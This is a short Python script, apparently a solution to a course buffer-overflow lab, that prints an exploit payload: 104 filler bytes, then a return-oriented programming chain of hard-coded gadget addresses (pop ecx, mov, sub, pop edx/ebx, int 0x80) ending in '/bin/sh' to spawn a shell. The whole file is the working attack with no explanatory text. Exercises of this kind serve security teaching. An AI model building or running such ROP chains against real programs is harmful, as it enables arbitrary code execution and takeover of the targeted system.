#!/usr/bin/env python3

import sys
from shellcode import shellcode
from struct import pack

# Your code here
#0xfffeb5e8
address = 0xfffeb694
sys.stdout.buffer.write(b"1"*104)

sys.stdout.buffer.write(pack("<I", 0x0806de72)) # pop ecx
sys.stdout.buffer.write(pack("<I", 0xffffffff)) # -12
sys.stdout.buffer.write(b"1"*4)                 # pop trash to ebx

sys.stdout.buffer.write(pack("<I", 0x0807c889)) # mov ecx, eax
sys.stdout.buffer.write(b"1"*8)    # pop esi, edi
sys.stdout.buffer.write(pack("<I", 0xfffffff4)) # pop ebp

sys.stdout.buffer.write(pack("<I", 0x08053bfa)) # sub ebp, eax
sys.stdout.buffer.write(b"1"*8) # pop edi, ebp

sys.stdout.buffer.write(pack("<I", 0x0806de72))  
sys.stdout.buffer.write(pack("<I", address+8))    # pop ecx
sys.stdout.buffer.write(b"1"*4)    # pop ebx

sys.stdout.buffer.write(pack("<I", 0x08056015))
sys.stdout.buffer.write(pack("<I", address+8))    # pop edx
sys.stdout.buffer.write(pack("<I", address))    # pop ebx

sys.stdout.buffer.write(pack("<I", 0x0806b651)) # int 0x80
sys.stdout.buffer.write(b"/bin/sh")




#0xfffeb5e8 + 104 + 12 + 16 + 12 + 12 + 12 + 8
#0xfffeb5e8 + ac = 0xfffeb694
